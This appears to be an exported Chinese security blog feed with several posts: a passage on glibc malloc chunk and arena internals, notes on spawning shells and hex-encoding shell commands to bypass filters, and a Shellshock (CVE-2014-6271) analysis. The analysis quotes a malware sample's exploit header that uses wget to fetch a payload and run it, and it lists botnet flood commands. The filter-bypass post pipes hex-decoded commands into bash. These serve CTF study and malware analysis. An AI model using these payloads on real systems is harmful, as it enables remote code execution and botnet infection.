<p>可能有很多读者会疑惑：该结构体里面并没有一个类似于data的字段来表示用户申请到的堆内存空间啊？且该结构体明确含有2个size_t类型的成员，4个指针，这不就意味着malloc_chunk的大小是固定的了么？那它又如何能够根据用户的请求分配不同大小的内存呢？要想回答清楚这个问题，需要我们完全理解整个glibc malloc的堆内存管理机制，同时，本文的主要目的之一就是希冀解释清楚这个概念，鉴于这部分内容较多，我将在后文的第5章加以详细介绍。</p>
<p><strong>NOTE:</strong></p>
<p>1.Main thread不含有多个heaps所以也就不含有heap_info结构体。当需要更多堆空间的时候，就通过扩展sbrk的heap segment来获取更多的空间，直到它碰到内存mapping区域为止。</p>
<p>2.不同于thread arena，main arena的arena header并不是sbrk heap segment的一部分，而是一个全局变量！因此它属于libc.so的data segment。</p>
<h4 id="4-2-heap-segment与arena关系"><a href="#4-2-heap-segment与arena关系" class="headerlink" title="4.2 heap segment与arena关系"></a>4.2 heap segment与arena关系</h4><p>首先，通过内存分布图理清malloc_state与heap_info之间的组织关系。</p>
<p>下图是只有一个heap segment的main arena和thread arena的内存分布图：</p>
<p><img src="/images/2017-09-10/v2-cdc4b19aeb0c5bd01d24589c303f5d3b_b.png" alt=""></p>
<p>图4-1 只含一个heap segment的main arena与thread arena图</p>
<p>下图是一个thread arena中含有多个heap segments的情况：</p>
<p><img src="/images/2017-09-10/v2-d1ef4f85211061232d4397f4929e8e91_b.png" alt=""></p>
<p>图4-2 一个thread arena含有多个heap segments的内存分布图</p>
<p>从上图可以看出，thread arena只含有一个malloc_state(即arena header)，却有两个heap_info(即heap header)。由于两个heap segments是通过mmap分配的内存，两者在内存布局上并不相邻而是分属于不同的内存区间，所以为了便于管理，libc malloc将第二个heap_info结构体的prev成员指向了第一个heap_info结构体的起始位置（即ar_ptr成员），而第一个heap_info结构体的ar_ptr成员指向了malloc_state，这样就构成了一个单链表，方便后续管理。</p>
<h3 id="5、对chunk的理解"><a href="#5、对chunk的理解" class="headerlink" title="5、对chunk的理解"></a>5、对chunk的理解</h3><p>在glibc malloc中将整个堆内存空间分成了连续的、大小不一的chunk，即对于堆内存管理而言chunk就是最小操作单位。Chunk总共分为4类：</p>
<p>1)allocated chunk;</p>
<p> 2)free chunk; </p>
<p>3)top chunk;</p>
<p> 4)Last remainder chunk。</p>
<p>从本质上来说，所有类型的chunk都是内存中一块连续的区域，只是通过该区域中<strong>特定位置的某些标识符</strong>加以区分。为了简便，我们先将这4类chunk简化为2类：allocated chunk以及free chunk，前者表示已经分配给用户使用的chunk，后者表示未使用的chunk。</p>
<p>众所周知，无论是何种堆内存管理器，其完成的核心目的都是能够高效地分配和回收内存块(chunk)。因此，它需要设计好相关算法以及相应的数据结构，而数据结构往往是根据算法的需要加以改变的。既然是算法，那么算法肯定有一个优化改进的过程，所以本文将根据堆内存管理器的演变历程，逐步介绍在glibc malloc中chunk这种数据结构是如何设计出来的，以及这样设计的优缺点。</p>
<p>PS:鉴于时间和精力有限，后文介绍的演变历程并没有加以严格考证，笔者只是按照一些参考书籍、自己的理解以及便于文章内容安排做出的“善意的捏造”，如有错误，欢迎大家斧正！</p>
<h4 id="5-1-隐式链表技术"><a href="#5-1-隐式链表技术" class="headerlink" title="5.1 隐式链表技术"></a>5.1 隐式链表技术</h4><p>前文说过，任何堆内存管理器都是以chunk为单位进行堆内存管理的，而这就需要一些数据结构来标志各个块的边界，以及区分已分配块和空闲块。大多数堆内存管理器都将这些边界信息作为chunk的一部分嵌入到chunk内部，典型的设计如下所示：</p>
<p><img src="/images/2017-09-10/v2-7e0628272e1bf28e38bc99849774c0c9_b.png" alt=""></p>
<p>图5-1 简单的allocated chunk格式</p>
<p><img src="/images/2017-09-10/v2-f092bde1862553448676a9adc97d6de3_b.png" alt=""></p>
<p>图5-2 简单的free chunk格式</p>
<p><font color="#f00">堆内存中要求每个chunk的大小必须为8的整数倍，因此chunk size的后3位是无效的，为了充分利用内存，堆管理器将这3个比特位用作chunk的标志位，典型的就是将第0比特位用于标记该chunk是否已经被分配。</font>这样的设计很巧妙，因为我们只要获取了一个指向chunk size的指针，就能知道该chunk的大小，即确定了此chunk的边界，且利用chunk size的第0比特位还能知道该chunk是否已经分配，这样就成功地将各个chunk区分开来。注意在allocated chunk中padding部分主要是用于地址对齐的(也可用于对付外部碎片)，即让整个chunk的大小为8的整数倍。</p>
<p>通过上面的设计，我们就能将整个堆内存组织成一个连续的已分配或未分配chunk序列:</p>
<p><img src="/images/2017-09-10/v2-df2d5bd535e5a00382d4647c0a900109_b.png" alt=""></p>
<p>图5-3 简单的chunk序列</p>
<p>上面的这种结构就叫做隐式链表。该链表隐式地由每个chunk的size字段链接起来，在进行分配操作的时候，堆内存管理器可以通过遍历整个堆内存的chunk，分析每个chunk的size字段，进而找到合适的chunk。</p>
<p>细心的读者可能发现：这种隐式链表效率其实是相当低的，特别是在内存回收方面，它难以进行相邻多个free chunk的合并操作。我们知道，如果只对free chunk进行分割，而不进行合并的话，就会产生大量小的、无法继续使用的内部碎片，直至整个内存消耗殆尽。因此堆内存管理器设计了带边界标记的chunk合并技术。</p>
<h5 id="1-带边界标记的合并技术"><a href="#1-带边界标记的合并技术" class="headerlink" title="1.带边界标记的合并技术"></a>1.带边界标记的合并技术</h5><p>试想如下场景：假设我们要释放的chunk为P，它紧邻的前一个chunk为FD，紧邻的后一个chunk为BK，且BK与FD都为free chunk。将P于BK合并在一起是很容易的，因为可以通过P的size字段轻松定位到BK的开始位置，进而获取BK的size等等，但是将P于FD合并却很难，我们必须从头遍历整个堆，找到FD，然后加以合并，这就意味着每次进行chunk释放操作消耗的时间与堆的大小成线性关系。为了解决这个问题，Knuth提出了一种聪明而通用的技术——边界标记。</p>
<p>Knuth在每个chunk的最后添加了一个脚部(Footer)，它就是该chunk 头部(header)的一个副本，我们称之为边界标记：</p>
<p><img src="/images/2017-09-10/v2-d31eb1d32944769bdd5477f3d277d7fd_b.png" alt=""></p>
<p>图5-4 改进版的chunk格式之Knuth边界标记</p>
<p>显然每个chunk的脚部都在其相邻的下一个chunk的头部的前4个字节处。通过这个脚部，堆内存管理器就可以很容易地得到前一个chunk的起始位置和分配状态，进而加以合并了。</p>
<p>但是，边界标记同时带来了一个问题：它要求每个块都包含一个头部和脚部，如果应用程序频繁地进行小内存的申请和释放操作的话(比如1，2个字节)，就会造成很大的性能损耗。同时，考虑到只有在对free chunk进行合并的时候才需要脚部，也就是说对于allocated chunk而言它并不需要脚部，因此我们可以对这个脚部加以优化——将前一个chunk的已分配/空闲标记位存储在当前chunk的size字段的第1，或2比特位上，这样如果我们通过当前chunk的size字段知道了前一个chunk为free chunk，那么就可得出结论：当前chunk地址之前的4个字节为前一个free chunk的脚部，我们可以通过该脚部获取前一个chunk的起始位置；如果当前chunk的size字段的标记位表明前一个chunk是allocated chunk的话，那么就可得出另一个结论：前一个chunk没有脚部，即当前chunk地址之前的4个字节为前一个allocated chunk的payload或padding的最后部分。新的chunk格式图如下：</p>
<p><img src="/images/2017-09-10/v2-0eadd69a889223eafc585134de13d866_b.png" alt=""></p>
<p>图5-5 改进版的Knuth边界标记allocated chunk格式</p>
<p><img src="/images/2017-09-10/v2-83f58d72c5b960bd72603c4a94477744_b.png" alt=""></p>
<p>图5-6 改进版的Knuth边界标记free chunk格式</p>
<h5 id="2-再进化——支持多线程"><a href="#2-再进化——支持多线程" class="headerlink" title="2.再进化——支持多线程"></a>2.再进化——支持多线程</h5><p>随着技术的发展，特别是堆内存管理器添加对多线程的支持，前述的chunk格式已经难以满足需求，比如，我们需要标志位来标记当前chunk是否属于非主线程即thread arena，以及该chunk由mmap得来还是通过brk实现等等。但此时chunk size只剩下一个比特位未使用了，怎么办呢？这需要对chunk格式进行大手术！</p>
<p>首先思考：是否有必要同时保存当前chunk和<strong>前一个chunk的已分配/空闲标记位？答案是否定的，因为我们只需要保存前一个chunk的分配标志位就可以了，至于当前chunk的分配标志位，可以通过查询下一个chunk的size字段得到</strong>。那么size字段中剩下的两个比特位就可以用于满足多线程的标志需求了：</p>
<p><img src="/images/2017-09-10/v2-9a5a0e9737b5dcb4e14ec4d186d8ddf6_b.png" alt=""></p>
<p>图5-7 多线程版本Knuth边界标记allocated chunk格式</p>
<p><img src="/images/2017-09-10/v2-66621268cd9759bd19e6dc07a41eab9c_b.png" alt=""></p>
<p>图5-8 多线程版本Knuth边界标记free chunk格式</p>
<p>这里的P,M,N的含义如下：</p>
<blockquote>
<p>PREV_INUSE(P): 表示前一个chunk是否为allocated。</p>
<p>IS_MMAPPED(M)：表示当前chunk是否是通过mmap系统调用产生的。</p>
<p>NON_MAIN_ARENA(N)：表示当前chunk是否是thread arena。</p>
</blockquote>
<p>再进一步，发现没必要保存chunk size的副本，也就是说Footer的作用并不大，但是如果前一个chunk是free的话，在合并的时候我们又需要知道前一个chunk的大小，怎么办呢？将Footer从尾部移到首部，同时其不再保存当前chunk的size，而是前一个free chunk的size不就行了。同样的，为了提高内存利用率，如果前一个chunk是allocated chunk的话，这个Footer就作为allocated chunk的payload或padding的一部分，结构图如下：</p>
<p><img src="/images/2017-09-10/v2-42f98a954d6d13971d640b34bfe60b55_b.png" alt=""></p>
<p>图5-9 当前glibc malloc allocated chunk格式</p>
<p><img src="/images/2017-09-10/v2-9dcc9c637c66bae48402c9bb9d11d568_b.png" alt=""></p>
<p>图5-10 当前glibc malloc free chunk格式</p>
<p>至此，glibc malloc堆内存管理器中使用的隐式链表技术就介绍完毕了。现在我们再回过头去看malloc_chunk结构体就很好理解了：该结构体通过每个chunk的prev_size和size构成了隐式链表，而后续的fd, bk等指针并不是作用于隐式链表的，而是用于后文会介绍的用于加快内存分配和释放效率的显示链表bin(还记得bin么？用于记录同一类型free chunk的链表)，并且这些指针跟prev_size一样只在free chunk中存在。关于显示链表bin的原理比较复杂，让我们带着疑惑，暂时略过这部分信息，等介绍完所有chunk之后再加以详细介绍。</p>
<h4 id="5-2-Top-Chunk"><a href="#5-2-Top-Chunk" class="headerlink" title="5.2 Top Chunk"></a>5.2 Top Chunk</h4><p>当一个chunk处于一个arena的最顶部(即最高内存地址处)的时候，就称之为top chunk。该chunk并<strong>不属于任何bin</strong>，而是在系统当前的所有free chunk(无论那种bin)都无法满足用户请求的内存大小的时候，将此chunk当做一个应急消防员，分配给用户使用。如果top chunk的大小比用户请求的大小要大的话，就将该top chunk分作两部分：1）用户请求的chunk；2）剩余的部分成为新的top chunk。否则，就需要扩展heap或分配新的heap了——在main arena中通过sbrk扩展heap，而在thread arena中通过mmap分配新的heap。</p>
<h4 id="5-3-Last-Remainder-Chunk"><a href="#5-3-Last-Remainder-Chunk" class="headerlink" title="5.3 Last Remainder Chunk"></a>5.3 Last Remainder Chunk</h4><p>要想理解此chunk就必须先理解glibc malloc中的bin机制。如果你已经看了第二部分文章，那么下面的原理就很好理解了，否则建议你先阅读第二部分文章。对于Last remainder chunk，我们主要有两个问题：1)它是怎么产生的；2)它的作用是什么？</p>
<p>先回答第一个问题。还记得第二部分文章中对small bin的malloc机制的介绍么？当用户请求的是一个small chunk，且该请求无法被small bin、unsorted bin满足的时候，就通过binmaps遍历bin查找最合适的chunk，如果该chunk有剩余部分的话，就将该剩余部分变成一个新的chunk加入到unsorted bin中，另外，<strong>再将该新的chunk变成新的last remainder chunk</strong>。</p>
<p>然后回答第二个问题。此类型的chunk用于提高连续malloc(small chunk)的效率，主要是提高内存分配的局部性。那么具体是怎么提高局部性的呢？举例说明。当用户请求一个small chunk，且该请求无法被small bin满足，那么就转而交由unsorted bin处理。同时，假设当前unsorted bin中只有一个chunk的话——就是last remainder chunk，那么就将该chunk分成两部分：前者分配给用户，剩下的部分放到unsorted bin中，并成为新的last remainder chunk。这样就保证了连续malloc(small chunk)中，各个small chunk在内存分布中是相邻的，即提高了内存分配的局部性。</p>
<p><strong>作者：走位@阿里聚安全，更多安全技术文章，请点击</strong><a href="https://jaq.alibaba.com/community/index" target="_blank" rel="external"><strong>阿里聚安全博客 </strong></a></p>
]]></content>
      
        <categories>
            
            <category> pwn </category>
            
        </categories>
        
        
        <tags>
            
            <tag> heap </tag>
            
            <tag> linux </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[获取shell的方法总结]]></title>
      <url>/2017/09/10/%E8%8E%B7%E5%8F%96shell%E7%9A%84%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/</url>
      <content type="html"><![CDATA[<p>最近做了一下pwnable.kr上面的题，对某些内容有了一定的感想，特别是获取shell这方面！</p>
<h4 id="姿势1"><a href="#姿势1" class="headerlink" title="姿势1"></a>姿势1</h4><blockquote>
<p> linux下的C++程序中：</p>
<p> system(&#39;set -s&#39;);  </p>
<p>其执行效果相当于获取一个shell</p>
</blockquote>
]]></content>
      
        <categories>
            
            <category> 安全技术 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> linux </tag>
            
            <tag> shell </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[shell下的进制转换]]></title>
      <url>/2017/09/09/shell%E4%B8%8B%E7%9A%84%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2/</url>
      <content type="html"><![CDATA[<p>最近一直在学filter绕过的姿势，所以急需shell下绕过的方法，其中关键的一环就是shell下的进制转换！</p>
<p>主要参考：</p>
<p><a href="https://stackoverflow.com/questions/1604765/linux-shell-scripting-hex-string-to-bytes" target="_blank" rel="external">https://stackoverflow.com/questions/1604765/linux-shell-scripting-hex-string-to-bytes</a></p>
<p><a href="https://stackoverflow.com/questions/6292645/convert-binary-data-to-hex-in-shell-script" target="_blank" rel="external">https://stackoverflow.com/questions/6292645/convert-binary-data-to-hex-in-shell-script</a></p>
<p>进制转换有多种工具，在linux上常见的有hexdump、od -x、xxd等</p>
<p>下面我们来简单介绍一下这些命令</p>
<h3 id="xxd"><a href="#xxd" class="headerlink" title="xxd"></a>xxd</h3><p>xxd比较常用，也比较好用</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">Usage:</div><div class="line">       xxd [options] [infile [outfile]]</div><div class="line">    or</div><div class="line">       xxd -r [-s [-]offset] [-c cols] [-ps] [infile [outfile]]</div><div class="line">Options:</div><div class="line">    -a          toggle autoskip: A single '*' replaces nul-lines. Default off.</div><div class="line">    -b          binary digit dump (incompatible with -ps,-i,-r). Default hex.</div><div class="line">    -c cols     format &lt;cols&gt; octets per line. Default 16 (-i: 12, -ps: 30).</div><div class="line">    -E          show characters in EBCDIC. Default ASCII.</div><div class="line">    -e          little-endian dump (incompatible with -ps,-i,-r).</div><div class="line">    -g          number of octets per group in normal output. Default 2 (-e: 4).</div><div class="line">    -h          print this summary.</div><div class="line">    -i          output in C include file style.</div><div class="line">    -l len      stop after &lt;len&gt; octets.</div><div class="line">    -o off      add &lt;off&gt; to the displayed file position.</div><div class="line">    -ps         output in postscript plain hexdump style.</div><div class="line">    -r          reverse operation: convert (or patch) hexdump into binary.</div><div class="line">    -r -s off   revert with &lt;off&gt; added to file positions found in hexdump.</div><div class="line">    -s [+][-]seek  start at &lt;seek&gt; bytes abs. (or +: rel.) infile offset.</div><div class="line">    -u          use upper case hex letters.</div><div class="line">    -v          show version: "xxd V1.10 27oct98 by Juergen Weigert".</div><div class="line">    -p：以一个整块输出所有的hex， 不使用空格进行分割</div></pre></td></tr></table></figure>
<p>上面的是xxd的用法，下面我们来逐步介绍！</p>
<blockquote>
<p> 将0x313233解释成123</p>
<p> root@test:/# echo 0x313233| xxd -r<br> 123root@test:/#</p>
</blockquote>
<blockquote>
<p>将123解释成0x313233</p>
<p>root@test:/# echo 123|xxd -ps<br>3132330a</p>
</blockquote>
<font color="#f00">需要注意的是，我们不能直接使用xxd -r 0x313233，原因是xxd后面只能接文件！而echo 123，并用管道连接，其实就是创建了一个临时文件交给xxd来处理</font>

<h4 id="局限"><a href="#局限" class="headerlink" title="局限"></a>局限</h4><p>​    每行有限定字符个数，xxd -ps限定每行最多有60个16进制数</p>
<p>​    而xxd -r则至多转换16个字符</p>
<h4 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">root@test:/# echo "export FF=\"/tmp/flag\";cat \$FF;echo vunerable"|xxd -p</div><div class="line">6578706f72742046463d222f746d702f666c6167223b636174202446463b</div><div class="line">6563686f2076756e657261626c650a</div><div class="line">root@test:/# echo "export FF=\"/tmp/flag\";cat \$FF;echo vunerable"|xxd -p|tr -d '\n'</div><div class="line">6578706f72742046463d222f746d702f666c6167223b636174202446463b6563686f2076756e657261626c650aroot@test:/#</div></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">root@test:/# echo "export FF=\"/tmp/flag\""|xxd -p</div><div class="line">6578706f72742046463d222f746d702f666c6167220a</div><div class="line">root@test:/# echo 0x6578706f72742046463d222f746d702f666c616722|xxd -rp</div><div class="line">export FF="/tmp/root@test:/# echo 0x6578706f72742046463d222f746d702f666c616722|xxd -r -p</div><div class="line">export FF="/tmp/flag"root@test:/#</div></pre></td></tr></table></figure>
<h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><ul>
<li>对于字符串转16进制中每行60个16进制的限制，可以使用echo 123|xxd -p|tr -d &#39;\n&#39;</li>
</ul>
<ul>
<li>对于16进制转字符串中至多转换16个字符的限制，可以使用xxd -r -p中的r和p一定得分开</li>
</ul>
<h4 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">root@test:/# echo "flag is here" &gt; /tmp/flag</div><div class="line">root@test:/# echo "\"export FF='/tmp/flag';cat \$FF\""|xxd -p|tr -d '\n'</div><div class="line">226578706f72742046463d272f746d702f666c6167273b63617420244646220aroot@test:/# </div><div class="line">root@test:/# echo 0x226578706f72742046463d272f746d702f666c6167273b6361742024464622|xxd -r -p|xargs bash -c</div><div class="line">flag is here</div></pre></td></tr></table></figure>
<p>上面的应用综合利用了所学的知识，其中前两步是铺垫，最后一步才是真正的poc。需要注意的是bash -c 一定接字符串，而且该字符串需要用双引号括起来！</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">root@test:/# echo "flag is here" &gt; /tmp/flag</div><div class="line">root@test:/# echo "export FF='/tmp/flag';cat \$FF"|xxd -p|tr -d '\n'</div><div class="line">6578706f72742046463d272f746d702f666c6167273b636174202446460aroot@test:/# </div><div class="line">root@test:/# echo 0x6578706f72742046463d272f746d702f666c6167273b63617420244646|xxd -r -p|bash -i</div><div class="line">root@test:/# export FF='/tmp/flag';cat $FF</div><div class="line">flag is here</div><div class="line">root@test:/# exit</div></pre></td></tr></table></figure>
<p>上面同样是十分完美的应用，主要特点是使用了bash -i，这相当于一个交互式的应用，管道线前面输出的内容会在这个交互中完成，完成后立刻退出！注意，管道线前面输出的内容不能用双引号括起来！</p>
<h3 id="perl的妙用"><a href="#perl的妙用" class="headerlink" title="perl的妙用"></a>perl的妙用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">cat found | sed &apos;s/.*: &quot;//g;s/ .*//;s/^0*//&apos; | xargs python -c &apos;import sys; print &quot;&quot;.join([bin(int(x)).lstrip(&quot;0b&quot;) for x in sys.argv[1:]])&apos; | perl -lpe &apos;$_=pack(&quot;B*&quot;,$_)&apos;</div><div class="line">最后的代码意思是前面管道输入的01字符串打包成8字节的字符串</div><div class="line"></div><div class="line">将A\B两种不同代码替换，并输出成字符串</div><div class="line">echo ABBBAAAABBBBBABBABBBABBB | perl -pe &apos;BEGIN &#123; binmode \*STDOUT &#125; chomp; tr/AB/\0\1/; $_ = pack &quot;B*&quot;, $_&apos;</div></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> 安全技术 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> linux </tag>
            
            <tag> shell </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[shellshock原理介绍]]></title>
      <url>/2017/09/09/shellshock%E5%8E%9F%E7%90%86%E4%BB%8B%E7%BB%8D/</url>
      <content type="html"><![CDATA[<h2 id="一-漏洞事件介绍"><a href="#一-漏洞事件介绍" class="headerlink" title="一.漏洞事件介绍"></a><strong>一.漏洞事件介绍</strong></h2><h3 id="1-漏洞信息"><a href="#1-漏洞信息" class="headerlink" title="1.漏洞信息"></a><strong>1.漏洞信息</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">●发布时间:2014-09-25　14时48分04秒</div><div class="line">●CVE ID:CVE-2014-6271</div><div class="line">●受影响版本:</div></pre></td></tr></table></figure>
<p><a href="http://image.3001.net/images/20140929/14119555774668.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20140929/14119555774668.png%21small" alt="受ShellShock影响的版本"></a></p>
<h3 id="2-漏洞概述"><a href="#2-漏洞概述" class="headerlink" title="2.漏洞概述"></a><strong>2.漏洞概述</strong></h3><p><strong>Bash(GNU Bourne-Again Shell)</strong>是大多数Linux系统以及Mac OS X v10.4默认的shell，它能运行于大多数Unix风格的操作系统之上，甚至被移植到了Microsoft Windows上的Cygwin系统中，以实现windows的POSIX虚拟接口.</p>
<p>Bash其广泛的使用将意味全球至少 150 万的主机将受到影响，此外 Linux/Unix 世界内的安卓和苹果都难以幸免。</p>
<p><a href="http://www.freebuf.com/news/44805.html" target="_blank" rel="external">破壳漏洞（ShellShock）</a>的严重性被定义为 10 级（最高）,而今年 4 月爆发的 OpenSSL(心脏出血)漏洞才 5 级！</p>
<h3 id="3-漏洞成因"><a href="#3-漏洞成因" class="headerlink" title="3.漏洞成因:"></a><strong>3.漏洞成因:</strong></h3><p>Bash 4.3以及之前的版本在处理某些构造的环境变量时存在安全漏洞，向环境变量值内的函数定义后添加多余的字符串会触发此漏洞，攻击者可利用此漏洞改变或绕过环境限制，以执行任意的shell命令,甚至完全控制目标系统</p>
<p>受到该漏洞影响的bash使用的环境变量是通过函数名称来调用的，以“(){”开头通过环境变量来定义的。而在处理这样的“函数环境变量”的时候，并没有以函数结尾“}”为结束，而是一直执行其后的shell命令</p>
<h3 id="4-漏洞测试"><a href="#4-漏洞测试" class="headerlink" title="4.漏洞测试:"></a><strong>4.漏洞测试:</strong></h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">(1).CVE-2014-6271 测试方式:</div><div class="line">      env x='() &#123; :;&#125;; exp' bash -c "echo this is a test" </div><div class="line">(2).CVE-2014-7169 测试方式:(CVE-2014-6271补丁更新后仍然可以绕过)</div><div class="line">      env -i X=';() &#123; (a)=&gt;\' bash -c 'echo date'; cat echo</div></pre></td></tr></table></figure>
<h3 id="5-修复方案"><a href="#5-修复方案" class="headerlink" title="5.修复方案"></a><strong>5.修复方案</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">请广大站长及时关注官网的安全补丁更新</div><div class="line">(1).针对RedHat、CentOS Liunx发行版本，请执行：</div><div class="line">    yum -y update bash</div><div class="line">(2).针对Debian Liunx发行版本，请执行：</div><div class="line">    sudo apt-get update &amp;&amp; sudo apt-get install --only-upgrade bash</div></pre></td></tr></table></figure>
<h2 id="二-样本概述"><a href="#二-样本概述" class="headerlink" title="二.样本概述"></a><strong>二.样本概述</strong></h2><h3 id="●样本来源"><a href="#●样本来源" class="headerlink" title="●样本来源:"></a><strong>●样本来源:</strong></h3><p>由于2014年9月24日法国某Linux爱好者公布了BASH漏洞(CVE-2014-6721),时至今日网络上已有利用该漏洞的病毒样本,我们于今日捕获到该漏洞样本,并进行了紧急分析</p>
<h3 id="●文件信息"><a href="#●文件信息" class="headerlink" title="●文件信息:"></a><strong>●文件信息:</strong></h3><p>文件名:nginx</p>
<p>文件大小:525KB</p>
<p>MD5:5924bcc045bb7039f55c6ce29234e29a  </p>
<p><a href="http://image.3001.net/images/20140929/14119556446899.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20140929/14119556446899.png%21small" alt="Bash 样本文件信息"></a></p>
<h3 id="●行为概述"><a href="#●行为概述" class="headerlink" title="●行为概述:"></a><strong>●行为概述:</strong></h3><p>该漏洞样本利用Bash漏洞进行传播扩散,并使用Linux Shell命令wget下载该样本并执行,该样本执行后首先会收集系统相关的信息(CPU,网络配置等信息),紧接着样本连接到自己的服务器,通过接受服务器发送的指令,来远程控制被感染机器,进而组建僵尸网络,进行洪水攻击,以及入侵中国某厂商,而入侵之后主要是为了莱特币的挖取</p>
<h2 id="三-样本详细分析"><a href="#三-样本详细分析" class="headerlink" title="三.样本详细分析"></a><strong>三.样本详细分析</strong></h2><h3 id="1-样本传播方式"><a href="#1-样本传播方式" class="headerlink" title="1.样本传播方式"></a><strong>1.样本传播方式</strong></h3><p>该样本利用Bash漏洞进行传播,其漏洞的利用只需要简单的几行命令即可,这无疑为利用者带来了极大的便利,利用代码如下:</p>
<p><a href="http://image.3001.net/images/20140929/14119557242937.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20140929/14119557242937.png%21small" alt="Bash样本利用代码"></a></p>
<p>而该样本通过wget将样本下载并执行,利用漏洞命令如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Cookie, ().&#123;.:;.&#125;;.wget /tmp/besh http://X.X.X.X/nginx; chmod.777 /tmp/besh; /tmp/besh;</div></pre></td></tr></table></figure>
<h3 id="2-样本行为分析"><a href="#2-样本行为分析" class="headerlink" title="2.样本行为分析"></a><strong>2.样本行为分析</strong></h3><p><strong>(1).获取计算机相关信息</strong></p>
<p>该样本启动后首先会获取计算机的相关信息,如CPU,网络配置等信息</p>
<p><a href="http://image.3001.net/images/20140929/14119557383644.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20140929/14119557383644.png%21small" alt="Bash样本获取计算机信息"></a></p>
<p><strong>(2).接着该样本连接自己的服务器(89.238.150.154:5)</strong></p>
<p>strace附加在创建的子进程样本上监视其行为如下:</p>
<p><a href="http://image.3001.net/images/20140929/14119557523092.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20140929/14119557523092.png%21small" alt="Bash样本连接自己的服务器"></a></p>
<p>但是C&amp;C的server已经挂掉了</p>
<p><strong>(3).如果连接服务器成功,则根据服务器传来的指令,远程控制被感染机器,命令集合如下:</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">PING </div><div class="line">GETLOCALIP </div><div class="line">SCANNER </div><div class="line">HOLD (DoS Flood) </div><div class="line">JUNK (DoS Flood) </div><div class="line">UDP (DoS Flood) </div><div class="line">TCP (DoS Flood) </div><div class="line">KILLATTK </div><div class="line">LOLNOGTFO</div></pre></td></tr></table></figure>
<p><strong>●PING命令:</strong></p>
<p><a href="http://image.3001.net/images/20140929/14119557641898.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20140929/14119557641898.png%21small" alt="Bash样本服务器的PING命令"></a></p>
<p>类似于心跳包,测试客户端服务器是否连接成功</p>
<p><strong>●GETLOCALIP</strong></p>
<p><a href="http://image.3001.net/images/20140929/14119557764384.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20140929/14119557764384.png%21small" alt="发送本机IP地址到目标服务器"></a></p>
<p>发送本机IP地址到目标服务器</p>
<p><strong>●SCANNER</strong></p>
<p>其主要是通过Busybox来对字符进行解析,从而设定扫描攻击目标,然后通过DVR scanner来对目标DVR设备进行扫描,看是否存在DVR漏洞,进而发起攻击</p>
<p><a href="http://image.3001.net/images/20140929/14119557914517.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20140929/14119557914517.png%21small" alt="Bash样本SCANNER"></a></p>
<p>我们通过busybox来对该字符串进行解析得到</p>
<p><a href="http://image.3001.net/images/20140929/14119558016271.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20140929/14119558016271.png%21small" alt="字符串剖析结果"></a></p>
<p>然而在样本中,我们发现:</p>
<p><a href="http://image.3001.net/images/20140929/14119558124398.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20140929/14119558124398.png%21small" alt="Bash样本中DVR Scanner"></a></p>
